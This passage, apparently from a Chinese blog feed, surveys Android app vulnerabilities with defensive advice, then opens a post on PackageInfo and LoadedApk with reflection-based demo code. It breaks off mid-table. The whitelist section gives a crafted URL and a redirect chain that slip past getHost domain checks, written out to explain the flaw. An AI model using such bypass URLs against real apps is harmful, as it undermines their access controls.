仅当与另一个应用组件绑定时，绑定服务才会运行。 多个组件可以同时绑定到该服务，但全部取消绑定后，该服务即会被销毁。</p><p><strong>危害</strong></p><p>​如果一个导出的 Service没有做严格的限制，任何应用可以去启动并且绑定到这个 Service上，取决于被暴露的功能，这有可能使得一个应用去<strong>执行未授权的行为</strong>，获取敏感信息或者是污染修改内部应用的状态造成威胁。</p><h4 id="Broadcast-receiver"><a href="#Broadcast-receiver" class="headerlink" title="Broadcast receiver"></a>Broadcast receiver</h4><p><strong>概述</strong></p><p>​BroadcastReceiver是 Android 的四大组件之一，这个组件涉及两个概念：广播发送者和广播接收者。这里的广播实际上指的就是 intent。当发送一个广播时，系统会将发送的广播 (intent)与系统中所有注册的符合条件的接收者的 IntentFilter 进行匹配，若匹配成功，则执行相应接收者的 onReceive 函数。可以通过两种方式注册广播接收器，一种是在Manifest.xml 文件中通过标签静态注册，另一种是通过Context.registerReceiver() 动态注册，指定相应的intentfilter参数。而动态注册的广播是默认导出的。</p><p><strong>危害</strong></p><p>​发送广播时如果处理不当，恶意应用便可以 <strong>嗅探</strong>、<strong>拦截广播</strong>，致使<strong>敏感数据泄露</strong> 等：</p><ul><li><strong>原理</strong>：发送的intent没有明确指定接收者，而是简单的通过action匹配。恶意应用可注册一个广播接收者嗅探拦截这个广播。</li><li><strong>防护</strong>：使用 <code>LocalBroadcastManager.sendBroadcast()</code>发出的广播只能被 app 自身广播器接收。</li></ul><p>​如果接收广播时处理不当，便可导致 <strong>拒绝服务攻击</strong>、<strong>伪造消息</strong>、<strong>越权操作</strong> 等。</p><h4 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h4><p><strong>概述</strong></p><p>​Content Provider负责进行 <strong>数据交互&amp;共享</strong>，即跨进程通信。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/944365-3c4339c5f1d4a0fd.png" alt="img"></p><p><strong>危害</strong></p><p><strong>信息泄露漏洞</strong></p><p>​如果对 Content Provider 的权限没有做好控制，就有可能导致恶意程序通过构造 Content URI 读取 App 的敏感数据。</p><p><strong>SQL注入漏洞</strong></p><p>​对 Content Provider 进行增删改查操作时，程序没有对用户的输入进行过滤，未采用参数化查询的方式，可能导致 sql 注入攻击。</p><p><strong>目录遍历漏洞</strong></p><p>​对外暴露的 Content Provider 组件实现了openFile() 接口，并且没有对 Content Provider 组件的访问进行权限控制，也没有对访问的目标文件的 Uri 进行有效判断，第三方应用程序可以利用该接口进行文件目录遍历，访问任意可读文件。</p><h4 id="四大组件的安全防护"><a href="#四大组件的安全防护" class="headerlink" title="四大组件的安全防护"></a>四大组件的安全防护</h4><h5 id="Activity-1"><a href="#Activity-1" class="headerlink" title="Activity"></a>Activity</h5><ol><li><p>谨慎处理接收的 Intent 以及其携带的信息；</p></li><li><p>私有 Activity 不应被其他应用启动且应该确保相对是安全的；</p></li><li><p>当 Activity 返回数据时候需注意目标 Activity 是否有泄露信息的风险，同时谨慎处理 Activity 返回的数据，目的 Activity 返回的数据有可能是恶意应用伪造的；</p></li><li><p>目标 Activity 十分明确时尽量使用显式 Intent；</p></li><li><p>验证目标 Activity 是否属于恶意 App，以免受到 Intent 欺骗，可用hash 签名验证；</p></li><li><p>尽可能的不发送敏感信息，应考虑到启动 public Activity 中 Intent 的信息均有可能被恶意应用窃取的风险；</p></li><li><p>不需要被外部程序调用的组件应该添加 <code>android:exported=&quot;false&quot;</code> 属性，这个属性说明它是私有的，只有同一个应用程序的组件或带有相同用户 ID 的应用程序才能启动或绑定该组件；</p></li><li><p>对于希望 Activity 能够被特定的外部程序访问，可以为其设置访问权限，具体做法有以下两种：</p><p>①组件添加android：permission属性；</p><p><code>android:permission:&quot;android.perrmission.SEND SMS&quot;</code><br>②protectionLevel权限声明；<br><code>android:protectionLevel=&quot;dangerous&quot;</code></p></li></ol><h5 id="Service-1"><a href="#Service-1" class="headerlink" title="Service"></a>Service</h5><ol><li>私有的 service 尽量不定义 intent-filter 并且设置 exported 属性为 false；</li><li>尽量用显式的方式启动 service；</li><li>合作 service 需对合作方的 App 签名做校验；</li><li>Service 接收到的数据需要谨慎处理；</li><li>内部 service 需使用签名级别的 protectionLevel 来判断是否为内部应用调用；</li><li>Service 不应在 onCreate 时决定是否提供服务，应在onStartCommand&#x2F;onBind&#x2F;onHandleIntent等方法被调用时做判断；</li><li>当 service 有返回数据时，应判断接收数据的组件是否有信息泄露的风险；</li><li>尽量不发送敏感信息；</li></ol><h5 id="Content-Provider-1"><a href="#Content-Provider-1" class="headerlink" title="Content Provider"></a>Content Provider</h5><ol><li>如果不需要与其他应用程序进行数据共享，就应该在 manifest 文件中设置 <code>android:exported=&quot;false&quot;</code>；</li><li>注意,在 API Level 低于8时，即使显式地声明了<code>android:exported=&quot;false&quot;</code>，其它应用程序仍然可以访问对应的Content Provider，所以尽量避免使用 Level 低于 8 的 API；</li><li>需要向外部提供数据的 Content Provider 需设置访问权限；</li><li>传递给 ContentProvider 的参数应该被视为不可信的输入，不应该在没有经过任何处理的情况下直接用于 SQL 查询；</li><li>避免使用 SQLiteDatabase 对象的 execSQL() 方法；</li></ol><h5 id="Broadcast-Receiver"><a href="#Broadcast-Receiver" class="headerlink" title="Broadcast Receiver"></a>Broadcast Receiver</h5><ol><li>私有广播接收器设置 <code>android:exported=&quot;false&quot;</code>，尽量不配置 intent-filter ；</li><li>私有广播尽量使用 LocalBroadcastManager <strong>动态注册</strong>和使用；</li><li>暴露的广播接收器需要对数据来源进行权限控制和身份验证；</li><li>广播接收器对于接收的数据要谨慎地使用多种异常来控制数据处理；</li><li>发送广播时如果包含敏感数据则需要显示意图，并通过 setPackage() 指定接收者包名；</li></ol><h4 id="默认设置漏洞"><a href="#默认设置漏洞" class="headerlink" title="默认设置漏洞"></a>默认设置漏洞</h4><h5 id="AndroidManifest-xml配置文件中默认设置相关问题"><a href="#AndroidManifest-xml配置文件中默认设置相关问题" class="headerlink" title="AndroidManifest.xml配置文件中默认设置相关问题"></a>AndroidManifest.xml配置文件中默认设置相关问题</h5><ol><li>allowBackup 默认设置风险（Android 2.1 以上的系统可为 App 提供应用程序数据的备份和恢复功能，AndroidManifest.xml 文件中的 allowBackup 属性值控制，其默认值为 true。当该属性没有显式设置为 false 时，攻击者可通过 adb backup 和 adb restore 对 App 的应用数据进行备份和恢复。）</li><li>Debuggable 默认设置风险；</li><li>组件默认导出风险。</li></ol><h4 id="WebView的默认设置问题"><a href="#WebView的默认设置问题" class="headerlink" title="WebView的默认设置问题"></a>WebView的默认设置问题</h4><p>​在 Android 开发中，经常会使用 Webview 来实现 WEB 页面的展示，在 Activity 中启动自己的浏览器或者简单的展示一些在线内容等。</p><ul><li>setAllowFileAccess()</li><li>setAllowContentAccess()</li><li>setAllowFileAccessFromFileURLs()</li><li>setAllowUniversalAccessFromFileURLs()</li><li>setSavePassword()</li></ul><ol><li>Webview默认开启密码保存功能 mWebview.setSavePassword(true)，如果该功能未关闭，在用户输入密码时，会弹出提示框，询问用户是否保存密码，如果选择“是”，密码会被明文保存到 <code>/data/data/com.package.name/databases/webview.db</code>，如果手机被 root 之后，获取 root 权限的 APP 就可以任意读取私有目录下的文件去获取用户的密码，因此建议用户密码需要加密存储。</li><li>Android 中默认 mWebView.setAllowFileAccess(true)，在 File 域下，能够执行任意的 JavaScript 代码，同源策略跨域访问能够对私有目录文件进行访问等。APP 对嵌入的 Webview 未对 file:&#x2F;&#x2F; 形式的 URL 做限制，会导致隐私信息泄露，针对 IM 类软件会导致聊天信息、联系人等等重要信息泄露，针对浏览器类软件，则更多的是 cookie 信息泄露。</li></ol><h4 id="网络相关"><a href="#网络相关" class="headerlink" title="网络相关"></a>网络相关</h4><h5 id="https通信安全漏洞"><a href="#https通信安全漏洞" class="headerlink" title="https通信安全漏洞"></a>https通信安全漏洞</h5><p>​在 Android 中使用 SSL&#x2F;TLS 协议，通过校验服务器端证书来实现安全通信。（这里指单向 SSL 校验，与之对应的是双向 SSL 校验，双向 SSL 指的是同时校验客户端和服务器端证书。）<br><strong>https证书不校验漏洞</strong>：忽略SSL证书校验、忽略域名校验、证书颁发机构被攻击导致私钥泄露，导致中间人攻击，攻击者可通过中间人攻击，盗取账户密码明文、聊天内容、通讯地址、电话号码以及信用卡支付信息等敏感信息，甚至通过中间人劫持将原有信息替换成恶意链接或恶意代码程序，以达到远程控制、恶意扣费等攻击意图。</p><h5 id="忽略SSL证书校验"><a href="#忽略SSL证书校验" class="headerlink" title="忽略SSL证书校验"></a>忽略SSL证书校验</h5><p><strong>原理</strong></p><ul><li>在自定义实现 X509TrustManager 时，checkServerTrusted 中没有检查证书是否可信，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li><li>在重写 WebviewClient 的 onReceivedSslError 方法时，调用 proceed 忽略证书验证错误信息继续加载页面，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li></ul><p><strong>防护</strong></p><ol><li>建议自定义实现 X509TrustManager 时，在 checkServerTrusted 中对服务器信息进行严格校验。针对自定义 TrustManager，检查 checkServerTrusted() 函数是否为空实现。</li><li>建议不要重写 TrustManager 和 HostnameVerifier，使用系统默认的。</li><li>在重写 WebViewClient 的。 onReceivedSslError 方法时，避兔调用 proceed 忽略证书验证错误信息继续加载页面。</li><li>禁止使用 proceed() 函数忽略证书错误，应该抛给系统进行安全警告。</li></ol><h5 id="忽略域名校验"><a href="#忽略域名校验" class="headerlink" title="忽略域名校验"></a>忽略域名校验</h5><p><strong>原理</strong></p><ul><li>在自定义实现 HostnameVerifier 时，没有在 verify 中进行严格证书校验，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li><li>在 HostnameVerifier 方法中使用 <code>ALLOW_ALL_HOSTNAME_VERIFIER</code>，信任所有 Hostname，导致通信过程中可能存在中间人攻击，造成敏感数据劫持危害。</li></ul><p><strong>防护</strong></p><ul><li>在自定义实现 HostnameVerifier 时，在 verify 中对 Hostname 进行严格校验。</li><li>建议在 HostnameVerifier 方法中使用 <code>STRICT_HOSTNAME_VERIFIER</code> 进行严格证书校验，避免使用 <code>ALLOW_ALL_HOSTNAME_VERIFIER</code>。</li></ul><h4 id="WebView安全漏洞"><a href="#WebView安全漏洞" class="headerlink" title="WebView安全漏洞"></a>WebView安全漏洞</h4><ol><li>远程代码执行漏洞</li><li>UXSS</li><li>Webview设置方面的安全风险</li><li>Webview忽略证书错误漏洞</li><li>Webview File域同源策略绕过漏洞</li></ol><h5 id="WebView设置方面的安全风险"><a href="#WebView设置方面的安全风险" class="headerlink" title="WebView设置方面的安全风险"></a>WebView设置方面的安全风险</h5><ol><li><code>setJavaScriptEnabled()</code>，默认为 false，即不允许执行JS代码。<code>webview.getWebSettings().setavaScriptEnabled(true);</code></li><li><code>setPluginState()</code>，它有三个状态值ON、ON DEMAND、OFF，默认为OFF。</li><li><code>setAllowFileAccess()</code> 默认为true，即允许从 WebView 访问本地文件。</li><li><code>setAllowContentAccess() </code>默认为 true，即允许从 WebView 加载Content URL，读取 content provider 相关内容。</li><li><code>setAllowFileAccessFromFileURLs()</code>，这个函数的作用是在 JS 没有禁用的情况下，设置是否允许 file 协议的 URL 访问其他 file 协议的URL 的文件内容。API15 及以下默认值为true，API16 及以上默认为false。</li><li><code>setAllowUniversalAccessFromFileURLs()</code>，这个函数的作用是在 JS 没有禁用的情况下，设置是否允许 file 协议的 URL 访问其他任意来源的内容。</li><li><code>setSavePassword() </code>默认值为true，这个函数的作用是设置是否允许 WebView 自动保存密码。</li></ol><h5 id="Webview-File域同源策略绕过漏洞"><a href="#Webview-File域同源策略绕过漏洞" class="headerlink" title="Webview File域同源策略绕过漏洞"></a>Webview File域同源策略绕过漏洞</h5><p><strong>原理</strong></p><p>​浏览器有一个很重要的概念——同源策略(Same-Origin Policy)。所谓同源是指，域名，协议，端口相同。不同源的客户端脚本(JavaScript、 ActionScript)在没明确授权的情况下，不能读写对方的资源。简单的来说，浏览器允许包含在页面 A 的脚本访问第二个页面 B 的数据资源，这一切是建立在 A 和 B 页面是同源的基础上。同源策略是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。<br>​在 Android 系统中，APP 访问网页一般是使用浏览器或者是使用了  Android 系统内置的 webview 组件。如果 Webview 没有禁止使用 file 域并且 Webview 打开了对 JavaScript 的支持。通过 Webview对 javascript<br> 的延时执行和将当前 Html 文件删除掉并软连接指向其他文件就可以读取到被符号链接所指的文件，然后通过 JavaScript 再次读取 HTML 文件，即可获取到被符号链接所指的文件。</p><h6 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h6><ol><li><p>将不必要导出的组件设置为不导出。</p></li><li><p>如果应用的需要导出包含 Webview 的组件，禁止使用 File 域协议。</p><p><code>myWebView.getSettings.setAllowFileAccess(false);</code></p></li><li><p>如果需要使用 File 协议，禁止 File 协议调用 JavaScript。</p><p><code>myWebView.getSettings.setavaScriptEnabled(false)</code></p></li></ol><h5 id="WebView安全防护"><a href="#WebView安全防护" class="headerlink" title="WebView安全防护"></a>WebView安全防护</h5><ol><li>手机厂商把手机内置的 WebView 与 Google 保持更新一致。</li><li>手机厂商把手机内置的浏览器漏洞修补程度要与 Google 官方保持一致，并且检测个性化自定义的暴露的 API 接口。</li><li>手机浏览器厂商浏览器漏洞修补程度要与 Google 官方保持一致，并且检测个性化自定义的暴露的 API 接口。</li><li>APP 开发人员注意 webview 的各项默认设置。</li><li>用户随时把手机的内置 webview 以及使用的浏览器更新到最新版本。</li></ol><h4 id="白名单绕过漏洞"><a href="#白名单绕过漏洞" class="headerlink" title="白名单绕过漏洞"></a>白名单绕过漏洞</h4><h5 id="签名白名单绕过"><a href="#签名白名单绕过" class="headerlink" title="签名白名单绕过"></a>签名白名单绕过</h5><h6 id="关于Android签名"><a href="#关于Android签名" class="headerlink" title="关于Android签名"></a>关于Android签名</h6><p>Android签名apk之后，会有一个META-INF文件夹，这里有三个文件:</p><ol><li><p>MANIFEST.MF</p><p>存储的是每一个文件对应的 SHA1 (或者 SHA256 )消息摘要算法提取出该文件的摘要然后进行 BASE64 编码。</p></li><li><p>CERT.SF</p><p>计算这个 MANIFEST.MF 文件的整体 SHA1 值，再经过BASE64编码后，记录在CERT.SF主属性块(在文件头上)的 <code>SHA1-Digest-Manifest</code> 属性值值下。<br>逐条计算MANIFEST.MF文件中每一个块的SHA1，并经过BASE64编码后，记录在CERT.SF中的同名 块中，属性的名字是<code>SHA1-Digest</code>。</p></li><li><p>CERT.RSA</p><p>会把之前生成的 CERT.SF 文件，用私钥计算出签名，然后将签名以及包含公钥信息的数字证书一同写入 CERT.RSA 中保存。CERT.RSA 是一个满足 PKCS7 格式的文件。</p></li></ol><p>​除了 RSA 格式的文件还有 CERT.DSA&#x2F;EC两种格式，Android 支持DSA、RSA、EC 三种加密算法进行签名，都是用来保存用私钥计算出 CERT.SF 文件的数字签名、证书发布机构、有效期、公钥、所有者、签名算法等信息。<br>​正常情况下，一个 APK 中只会生成一个 CERT.RSA&#x2F;DSA&#x2F;EC 签名文件。但若在 APK 压缩包中加入其他的签名文件，即可同时存在两个或两个以上的签名文件。</p><h6 id="URL白名单绕过漏洞"><a href="#URL白名单绕过漏洞" class="headerlink" title="URL白名单绕过漏洞"></a>URL白名单绕过漏洞</h6><p>​手机应用在特定环境下需要打开外部传入的URL，或者使用外部传入的 URL 去下载。为了对打开或下载的 URL 做控制，就需要对域名进行校验。<br>​对 URL 的域名进行校验，一般习惯使用系统 API，<code>getHost</code> 来获取域名进行字符串比较，但是由于 <code>getHost</code> 这个系统API的设计缺陷，使其可以被绕过。</p><p>​<code>[http://192.168.0.1\.163.com/2.html]</code>  这个 URL 使用<strong>getHost</strong> 得到的域名是 <code>192.168.0.1\.163.com</code>，这样在判断时很容易判断为正常域名可以进行访问，但是在实际打开这个 URL 时，Android的 webview 会将 URL 解析为 <code>[http://192.168.0.1/.163.com/2.html] </code>来访问，这样 <strong>.163.com</strong> 就变为了 <strong>192.168.0.1</strong> 这个IP地址下的一个path。这样 webview 就可能被打开一些不受控制的网页。但是在使用HttpClient 等API进行访问时会解析为<code>[http://192.168.0.1.163.com/2.html]</code>  所以此时并不能正常访问。但是由于开发习惯，一般这个对域名进行校验的方法会作为一个公共方法使用，所以建议使用其他方法来判断。<br>对于使用 getHost 方式获取 url 进行白名单判断的方式，还有另外一种绕过方式就是 url 跳转，类似如下的URL跳转都是基于主站的跳转，即便是对于上面提到的这种白名单绕过方式进行了有效限制，但是还是可以进行绕过，由于很多公司对 url 跳转漏洞都不是很重视，所以结合 url 跳转漏洞进行的攻击在有的时候也可以达到令人惊奇的程度，危害还是非常严重的，比如说静默下载安装<code>[http://mbs.hao.163.cn/?c=redirect&amp;ur=http://tu.623.cn/7vNo]</code></p><h4 id="Socket远程连接漏洞"><a href="#Socket远程连接漏洞" class="headerlink" title="Socket远程连接漏洞"></a>Socket远程连接漏洞</h4><p>​如果手机开放端口，但是缺少对发送者的身份验证或者是存在权限控制缺陷，导致黑客拿下这个端口的权限，便可以获得手机此端口开放的所有功能。此漏洞只与 App 有关，不受系统版本影响。</p><h4 id="APK升级漏洞"><a href="#APK升级漏洞" class="headerlink" title="APK升级漏洞"></a>APK升级漏洞</h4><table><thead><tr><th align="center">APP 升级流程</th><th align="center">隐患</th><th align="center">漏洞危害</th></tr></thead><tbody><tr><td align="center">升级API</td><td align="center">升级API未加密</td><td align="center">返回恶意下载地址，可下载恶意APK</td></tr><tr><td align="center">下载API</td><td align="center">下载API未加密</td><td align="center">下载路径被篡改，可下载恶意APK</td></tr><tr><td align="center">程序安装API</td><td align="center">APK本地路径篡改</td><td align="center">安装错误的APK</td></tr></tbody></table><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="加密算法是否存在安全缺陷"><a href="#加密算法是否存在安全缺陷" class="headerlink" title="加密算法是否存在安全缺陷"></a>加密算法是否存在安全缺陷</h5><p>​客户端与服务器通信或数据存储往往采用一些加密算法来保障数据的安全，但是这些算法本身可能存在缺陷。</p><h5 id="不安全的哈希-加密算法"><a href="#不安全的哈希-加密算法" class="headerlink" title="不安全的哈希&#x2F;加密算法"></a>不安全的哈希&#x2F;加密算法</h5><ol><li>MD5 哈希算法易遭到已知的哈希冲突攻击。 哈希算法用于确保数据完整性（例如，文件签名或数字证书）时尤其易被攻击。 在这种情况下，攻击者可能会生成两个独立的数据块，以便在不更改哈希值或使相关数字签名无效的情况下，将良性数据替换为恶意数据。</li><li>DES 加密使用的密钥强度较低，可能在一天内被暴力破解。</li><li>RC2 加密容易遭受与密钥相关的攻击，攻击者可以通过这些攻击找出所有密钥值之间的数学关系。</li></ol><h5 id="弱加密算法"><a href="#弱加密算法" class="headerlink" title="弱加密算法"></a>弱加密算法</h5><ol><li>TripleDES 等加密算法和 SHA1 及 RIPEMD160 等哈希算法被视为弱加密算法。</li><li>这些加密算法不能与更现代的对应算法提供同样多的安全保证。</li><li>与更现代的哈希算法相比，加密哈希算法 SHA1 和 RIPEMD160 提供的冲突抗性较低。与更现代的加密算法相比，加密算法 TripleDES 提供的安全位数更少。</li></ol><h5 id="重放攻击风险"><a href="#重放攻击风险" class="headerlink" title="重放攻击风险"></a>重放攻击风险</h5><p><strong>原理</strong></p><p>​重放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p><p><strong>防护</strong></p><p>​建议在客户端与服务端通信时加上时间戳或判断是否已登录过等条件，防止重放攻击。</p><h5 id="业务接口是否存在任意权限调用"><a href="#业务接口是否存在任意权限调用" class="headerlink" title="业务接口是否存在任意权限调用"></a>业务接口是否存在任意权限调用</h5><p><strong>原理</strong></p><p>​在正常的业务中，敏感功能的接口需要对访问者的身份进行验证，验证通过后才允许调用接口进行操作。接口未做身份验证或身份校验不严，可能导致非授权访问或越权调用。</p><p><strong>防护</strong></p><ul><li>建议每个用户登陆后使用随机id进行标识，随时更换新id或在通信过程中使用更多参数如时间戳、数字签名等防止用户越权获取到其他用户的订单等信息。采用加密通信如https安全传输也能在一定程度上解决该问题。</li><li>建议在本地做好输入数据的校验，在通信过程中应采用多个参数对某次通信进行标识和记录。保证参数的随机性和机密性，防止攻击者构造出针对系统健壮性进行攻击的请求数据。</li></ul><h4 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h4><ul><li>LogCat 输出敏感信息</li><li>敏感数据明文存储于 sdcard</li><li>数据库敏感数据明文存储</li><li>Shared preference 全局可读写</li><li>敏感信息硬编码</li><li>HTTP 敏感信息明文传输</li></ul><h4 id="ZIP解压缩漏洞"><a href="#ZIP解压缩漏洞" class="headerlink" title="ZIP解压缩漏洞"></a>ZIP解压缩漏洞</h4><p>​ZIP压缩包文件中允许存在 <code>../</code> 的字符串，攻击者可通过精心构造ZIP文件，利用多个 <code>../</code> 从而改变 ZIP 包中某个文件的存放位置，覆盖替换掉应用原有的文件。如果被覆盖掉的文件是 so 文件、dex 文件或者 odex 文件，轻则产生本地拒绝服务漏洞，影响应用的可用性，重则可能造成任意代码执行漏洞，危害应用用户的设备安全和信息安全。比如“寄生兽”漏洞，海豚浏览器远程命令执行漏洞，三星默认输入法远程代码执行等。</p><h3 id="四、结语"><a href="#四、结语" class="headerlink" title="四、结语"></a>四、结语</h3><p>​这块内容很多很杂，本人也只是做了一些浅显的学习总结，更多更深的内容还是得需要在真是开发生产中遇到并学习。</p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从源码分析 PackageInfo 和 LoadedApk</title>
      <link href="/2025/10/10/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20PackageInfo%20%E5%92%8C%20LoadedApk/"/>
      <url>/2025/10/10/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%20PackageInfo%20%E5%92%8C%20LoadedApk/</url>
      
        <content type="html"><![CDATA[<h1 id="从源码分析-PackageInfo-和-LoadedApk"><a href="#从源码分析-PackageInfo-和-LoadedApk" class="headerlink" title="从源码分析 PackageInfo 和 LoadedApk"></a>从源码分析 PackageInfo 和 LoadedApk</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​之前在学习 Android 加固的时候，涉及到 classLoader、LoadedApk等的内容，感觉定义界限有点模糊不清，看着看着就晕了，后来痛定思痛觉得应该好好梳理一下这方面的内容。于是便记录下学习过程。</p><p>​还是沿用之前学习 so 加载过程的思想，从最顶层，也就是我们在开发时直接接触到代码开始分析。</p><h3 id="二、基本概念"><a href="#二、基本概念" class="headerlink" title="二、基本概念"></a>二、基本概念</h3><p>​于是写了一个简单的 demo，关键代码如下</p><p>获取 PackageInfo，并打印其参数</p><pre><code class="language-Java">    private String buildInfo() &#123;        StringBuilder sb = new StringBuilder();        try &#123;            PackageManager pm = getPackageManager();            PackageInfo pi = pm.getPackageInfo(                    getPackageName(),                    PackageManager.GET_ACTIVITIES                            | PackageManager.GET_SERVICES                            | PackageManager.GET_PROVIDERS                            | PackageManager.GET_RECEIVERS                            | PackageManager.GET_PERMISSIONS                            | PackageManager.GET_SIGNING_CERTIFICATES            );            sb.append(&quot;PackageInfo\n&quot;);            sb.append(&quot;packageName: &quot;).append(pi.packageName).append(&#39;\n&#39;);            sb.append(&quot;versionName: &quot;).append(pi.versionName).append(&#39;\n&#39;);            sb.append(&quot;versionCode: &quot;).append(pi.getLongVersionCode()).append(&#39;\n&#39;);            sb.append(&quot;firstInstallTime: &quot;).append(pi.firstInstallTime).append(&#39;\n&#39;);            sb.append(&quot;lastUpdateTime: &quot;).append(pi.lastUpdateTime).append(&#39;\n&#39;);            ApplicationInfo ai = pi.applicationInfo;            if (ai != null) &#123;                sb.append(&quot;sourceDir: &quot;).append(ai.sourceDir).append(&#39;\n&#39;);                sb.append(&quot;publicSourceDir: &quot;).append(ai.publicSourceDir).append(&#39;\n&#39;);                sb.append(&quot;dataDir: &quot;).append(ai.dataDir).append(&#39;\n&#39;);                sb.append(&quot;nativeLibraryDir: &quot;).append(ai.nativeLibraryDir).append(&#39;\n&#39;);            &#125;            SigningInfo si = pi.signingInfo;            if (si != null) &#123;                sb.append(&quot;signing: &quot;).append(si.hasMultipleSigners() ? &quot;multiple&quot; : &quot;single&quot;).append(&#39;\n&#39;);                Signature[] signatures = si.hasMultipleSigners() ? si.getApkContentsSigners() : si.getSigningCertificateHistory();                if (signatures != null) &#123;                    for (int i = 0; i &lt; signatures.length; i++) &#123;                        sb.append(&quot;signature[&quot;).append(i).append(&quot;] sha256: &quot;).append(bytesToHex(signatures[i].toByteArray())).append(&#39;\n&#39;);                        try &#123;                            CertificateFactory cf = CertificateFactory.getInstance(&quot;X.509&quot;);                            X509Certificate cert = (X509Certificate) cf.generateCertificate(new ByteArrayInputStream(signatures[i].toByteArray()));                            sb.append(&quot;  subject: &quot;).append(cert.getSubjectDN()).append(&#39;\n&#39;);                            sb.append(&quot;  issuer: &quot;).append(cert.getIssuerDN()).append(&#39;\n&#39;);                            sb.append(&quot;  serial: &quot;).append(cert.getSerialNumber()).append(&#39;\n&#39;);                        &#125; catch (Throwable t) &#123;                            sb.append(&quot;  cert parse failed: &quot;).append(t.getClass().getSimpleName()).append(&#39;\n&#39;);                        &#125;                    &#125;                &#125;            &#125;        &#125; catch (Throwable e) &#123;            sb.append(&quot;PackageInfo error: &quot;).append(e).append(&#39;\n&#39;);        &#125;        sb.append(&#39;\n&#39;);        sb.append(&quot;LoadedApk\n&quot;);        sb.append(getLoadedApkDetails());        return sb.toString();    &#125;</code></pre><p>获取 LoadedApk 并打印参数</p><pre><code class="language-Java">    private String getLoadedApkDetails() &#123;        StringBuilder sb = new StringBuilder();        Object loadedApk = null;        try &#123;            Context base = getBaseContext();            try &#123;                // mPackageInfo 是当前Context对应的单个应用包信息                Field f = base.getClass().getDeclaredField(&quot;mPackageInfo&quot;);                f.setAccessible(true);                loadedApk = f.get(base);            &#125; catch (Throwable ignore) &#123; &#125;            if (loadedApk == null) &#123;                // 拿到ActivityThread类对象                Class&lt;?&gt; activityThreadClass = Class.forName(&quot;android.app.ActivityThread&quot;);                // 获取当前进程的ActivityThread实例                Method currentActivityThread = activityThreadClass.getDeclaredMethod(&quot;currentActivityThread&quot;);                currentActivityThread.setAccessible(true);                Object at = currentActivityThread.invoke(null);                // 获取mPackages对象                // mPackages属于ActivityThread，是全局缓存，保存所有已加载应用包                Field mPackagesField = activityThreadClass.getDeclaredField(&quot;mPackages&quot;);                mPackagesField.setAccessible(true);                // 通过包名获取当前应用的 LoadedApk 对象                java.util.Map&lt;?,?&gt; packages = (java.util.Map&lt;?,?&gt;) mPackagesField.get(at);                Object wr = packages.get(getPackageName());                if (wr instanceof WeakReference) &#123;                    loadedApk = ((WeakReference&lt;?&gt;) wr).get();                &#125;            &#125;            if (loadedApk != null) &#123;                sb.append(&quot;object: &quot;).append(loadedApk.toString()).append(&#39;\n&#39;);                try &#123;                    Class&lt;?&gt; laClass = Class.forName(&quot;android.app.LoadedApk&quot;);                    Field[] fields = laClass.getDeclaredFields();                    for (Field field : fields) &#123;                        field.setAccessible(true);                        Object val;                        try &#123;                            val = field.get(loadedApk);                        &#125; catch (Throwable t) &#123;                            val = t.getClass().getSimpleName();                        &#125;                        sb.append(field.getName()).append(&quot;=&quot;).append(String.valueOf(val)).append(&#39;\n&#39;);                    &#125;                &#125; catch (Throwable t) &#123;                    sb.append(&quot;fields reflect failed: &quot;).append(t).append(&#39;\n&#39;);                &#125;            &#125; else &#123;                sb.append(&quot;LoadedApk not found (possibly blocked by hidden API)&quot;);            &#125;        &#125; catch (Throwable e) &#123;            sb.append(&quot;LoadedApk error: &quot;).append(e);        &#125;        return sb.toString();    &#125;</code></pre><p>​demo 的代码逻辑很简单，就是直接 or 间接获取到，再打印所含信息。</p><p>​然后接下来先来解释一下这两者的概念和关系。</p><h4 id="PackageInfo"><a href="#PackageInfo" class="headerlink" title="PackageInfo"></a>PackageInfo</h4><p>​总的来说，<strong>PackageInfo</strong> 是应用 **安装时（parse + install 阶段）**由系统解析 <code>AndroidManifest.xml</code>、签名、资源等信息后生成的 结构化描述对象。它反映的是“<strong>包的静态信息</strong>”——也就是 APK 文件里声明的东西，不是运行时对象。</p><p>​概念图：</p><pre><code class="language-scss">PackageManagerService  └── PackageParser.parsePackage()          // 解析 AndroidManifest.xml        ├── 生成 PackageParser.Package 对象        ├── 解析组件（Activity、Service、Provider、Receiver）        ├── 解析权限声明        ├── 解析签名、meta-data、sharedUserId 等        └── ...  └── generatePackageInfo()                 // 把 Package 转为 PackageInfo</code></pre><p>​最终会得到一个 PackageInfo，被保存到：</p><ul><li>系统文件 <code>/data/system/packages.xml</code></li><li>运行时缓存（<code>mPackages</code>）里也有一份。</li></ul><p>​那么 PackageInfo 都包括哪些信息呢？以下是 PackageInfo 的典型字段分类</p><table><thead><tr><th>分类</th><th>字段</th><th>说明</th></tr></thead><tbody><tr><td><strong>基本信息</strong></td><td><code>packageName</code>, <code>versionCode</code>, <code>versionName</code>, <code>firstInstallTime</code>, <code>lastUpdateTime</code></td><td>来自 manifest 和安装时记录</td></tr><tr><td><strong>应用信息</strong></td><td><code>applicationInfo</code>（类型：<code>ApplicationInfo</code>）</td><td>包含 APK 路径（<code>sourceDir</code>）、<code>dataDir</code>、<code>nativeLibraryDir</code> 等</td></tr><tr><td><strong>组件列表</strong></td><td><code>activities</code>, <code>services</code>, <code>providers</code>, 